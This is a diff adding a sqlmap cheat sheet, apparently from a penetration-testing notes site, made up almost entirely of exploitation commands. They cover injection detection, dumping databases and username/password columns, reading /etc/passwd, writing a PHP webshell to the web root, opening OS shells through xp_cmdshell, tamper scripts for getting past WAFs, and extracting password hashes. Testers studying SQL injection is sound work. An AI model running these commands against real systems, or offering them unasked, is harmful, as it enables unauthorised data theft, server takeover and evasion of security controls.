@@ -1,0 +1,189 @@
+---
+title: "sqlmap"
+---
+
+Automated SQL injection detection and exploitation. Always use `-r` with a saved Burp request for accuracy: it preserves headers, cookies, and POST bodies exactly. Use `--batch` to skip interactive prompts.
+
+## Detection
+
+```bash wrap
+# From a saved Burp request (most reliable)
+sqlmap -r request.txt --batch
+
+# GET parameter
+sqlmap -u "http://$TARGET/page?id=1" --batch
+
+# POST data
+sqlmap -u "http://$TARGET/login" --data="user=foo&pass=bar" --batch
+
+# With session cookie
+sqlmap -u "http://$TARGET/page?id=1" --cookie="PHPSESSID=$COOKIE" --batch
+
+# Custom header (e.g. injection in User-Agent or X-Forwarded-For)
+sqlmap -u "http://$TARGET/page" -H "X-Forwarded-For: 1*" --batch
+
+# JSON body
+sqlmap -u "http://$TARGET/api/item" --data='{"id":"1"}' --content-type="application/json" --batch
+
+# Mark injection point with * in the request file
+# In request.txt: id=1* → sqlmap tests only that parameter
+sqlmap -r request.txt -p id --batch
+```
+
+## Enumeration
+
+Run these sequentially: confirm injection first, then enumerate downward (dbs → tables → columns → dump).
+
+```bash wrap
+# List databases
+sqlmap -r request.txt --dbs --batch
+
+# List tables in a database
+sqlmap -r request.txt -D $DB --tables --batch
+
+# List columns in a table
+sqlmap -r request.txt -D $DB -T $TABLE --columns --batch
+
+# Dump a table
+sqlmap -r request.txt -D $DB -T $TABLE --dump --batch
+
+# Dump specific columns only
+sqlmap -r request.txt -D $DB -T $TABLE -C username,password --dump --batch
+
+# Dump all databases (noisy, slow)
+sqlmap -r request.txt --dump-all --batch
+
+# Check current user and privileges
+sqlmap -r request.txt --current-user --current-db --is-dba --batch
+sqlmap -r request.txt --privileges --batch
+```
+
+## Techniques
+
+```bash wrap
+# Force specific techniques (default: BEUSTQ)
+# B: Boolean-based blind
+# E: Error-based
+# U: UNION-based
+# S: Stacked queries
+# T: Time-based blind
+# Q: Inline queries
+sqlmap -r request.txt --technique=EU --batch   # fast, error + union only
+sqlmap -r request.txt --technique=BT --batch   # blind only
+
+# Specify UNION column count if auto-detection fails
+sqlmap -r request.txt --union-cols=5 --batch
+
+# Force string to identify true/false in boolean-based
+sqlmap -r request.txt --string="Welcome" --batch
+sqlmap -r request.txt --not-string="Invalid" --batch
+
+# Increase time-based delay (default 5s)
+sqlmap -r request.txt --technique=T --time-sec=10 --batch
+```
+
+## File Read / Write
+
+Requires `FILE` privilege on MySQL (`LOAD_FILE`), or equivalent on other DBs.
+
+```bash wrap
+# Read a file from the server
+sqlmap -r request.txt --file-read="/etc/passwd" --batch
+sqlmap -r request.txt --file-read="C:/Windows/System32/drivers/etc/hosts" --batch
+
+# Write a webshell
+sqlmap -r request.txt \
+  --file-write="shell.php" \
+  --file-dest="/var/www/html/shell.php" --batch
+```
+
+## OS Interaction
+
+Requires stacked queries and sufficient DB privileges (DBA on MySQL/MSSQL, or `xp_cmdshell` enabled on MSSQL).
+
+```bash wrap
+# Interactive OS shell
+sqlmap -r request.txt --os-shell --batch
+
+# Single command
+sqlmap -r request.txt --os-cmd="id" --batch
+
+# MSSQL: enable xp_cmdshell if disabled
+sqlmap -r request.txt --os-shell --technique=S --batch
+```
+
+## WAF Bypass / Tamper Scripts
+
+```bash wrap
+# List all available tamper scripts
+sqlmap --list-tampers
+
+# Common tampers
+sqlmap -r request.txt --tamper=space2comment --batch          # spaces → /**/
+sqlmap -r request.txt --tamper=between --batch                # > → BETWEEN
+sqlmap -r request.txt --tamper=randomcase --batch             # RaNdOm cAsE
+sqlmap -r request.txt --tamper=charencode --batch             # URL encode
+sqlmap -r request.txt --tamper=apostrophemask --batch         # ' → %EF%BC%87
+
+# Stack multiple tampers
+sqlmap -r request.txt --tamper=space2comment,randomcase,between --batch
+
+# Increase level/risk for more payloads (default: level=1 risk=1)
+sqlmap -r request.txt --level=5 --risk=3 --batch
+```
+
+## Second-Order Injection
+
+Input is stored and reflected in a different endpoint.
+
+```bash wrap
+sqlmap -r request.txt --second-url="http://$TARGET/profile" --batch
+```
+
+## Performance & Proxy
+
+```bash wrap
+# Threads (default 1)
+sqlmap -r request.txt --threads=10 --batch
+
+# Route through Burp
+sqlmap -r request.txt --proxy="http://127.0.0.1:8080" --batch
+
+# Delay between requests (seconds)
+sqlmap -r request.txt --delay=1 --batch
+
+# Randomise user-agent
+sqlmap -r request.txt --random-agent --batch
+```
+
+## Useful Flags
+
+```bash wrap
+--batch              # never ask for user input, use defaults
+--flush-session      # ignore cached results for the target
+--fresh-queries      # re-run all queries (ignore session cache)
+--forms              # auto-detect and test HTML forms
+--crawl=2            # crawl depth from the start URL
+--output-dir=out/    # save results to a directory
+--answers="extending=N,follow=Y"  # pre-answer specific prompts
+-v 3                 # verbose: show payloads sent
+--dbms=mysql         # skip fingerprinting, force DB type
+--no-cast            # disable result casting (helps with some edge cases)
+```
+
+## DB-Specific Notes
+
+```bash wrap
+# MySQL: get password hashes
+sqlmap -r request.txt --passwords --batch
+
+# MSSQL: enable and use xp_cmdshell
+sqlmap -r request.txt --os-shell --technique=S --dbms=mssql --batch
+
+# Oracle: current user
+sqlmap -r request.txt --current-user --dbms=oracle --batch
+
+# SQLite: dump everything (no concept of databases, just tables)
+sqlmap -r request.txt --tables --batch
+sqlmap -r request.txt -T users --dump --batch
+```
